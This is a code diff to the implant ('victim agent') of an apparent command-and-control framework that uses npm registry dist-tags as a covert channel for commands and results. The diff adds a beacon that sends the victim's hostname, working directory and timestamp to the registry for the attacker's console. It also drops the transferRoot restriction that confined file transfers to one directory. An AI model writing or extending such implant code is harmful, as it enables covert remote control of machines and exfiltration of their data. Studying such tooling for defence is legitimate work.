@@ -10,6 +10,7 @@
 //  - SIGINT/SIGTERM flush state and exit cleanly
 
 import fs from 'node:fs';
+import os from 'node:os';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import { pathToFileURL } from 'node:url';
@@ -18,6 +19,7 @@ import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
   decodeCommandTag,
+  encodeAnnounceTag,
   encodeResultTags,
   isCommandTag,
 } from '../common/protocol.js';
@@ -95,7 +97,7 @@ export function selectCommands(distTags, state, agentId) {
  * @param {object} deps.client RegistryClient (or fake with setDistTag)
  * @param {object} deps.logger
  * @param {Function} [deps.save] persist callback, called after each state change
- * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, transferRoot }
+ * @param {object} [deps.limits] task limits, e.g. { maxFileBytes }
  * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
  */
 export async function processDistTags({ distTags, state, agentId, client, logger, save, limits = {} }) {
@@ -174,9 +176,23 @@ async function main() {
 
   logger.info(`victim agent ${state.agentId} starting`);
   logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
-  logger.info(`transferRoot=${path.resolve(cfg.transferRoot)} maxFileBytes=${cfg.maxFileBytes}`);
+  logger.info(`cwd=${process.cwd()} maxFileBytes=${cfg.maxFileBytes}`);
   if (!cfg.token) {
     logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
+  }
+
+  // Announce ourselves once so the attacker CLI can show "agent joined".
+  // Best-effort: a failed announce must not stop the poll loop.
+  try {
+    const tag = encodeAnnounceTag(state.agentId, {
+      ts: Date.now(),
+      cwd: process.cwd(),
+      host: os.hostname(),
+    });
+    await client.setDistTag(tag, PINNED_VERSION);
+    logger.info('announce tag published');
+  } catch (err) {
+    logger.warn(`failed to publish announce tag: ${err.message}`);
   }
 
   let running = true;
@@ -206,7 +222,7 @@ async function main() {
         client,
         logger,
         save,
-        limits: { maxFileBytes: cfg.maxFileBytes, transferRoot: cfg.transferRoot },
+        limits: { maxFileBytes: cfg.maxFileBytes },
       });
       if (stats.executed > 0 || stats.skipped > 0) {
         logger.info('cycle summary', stats);
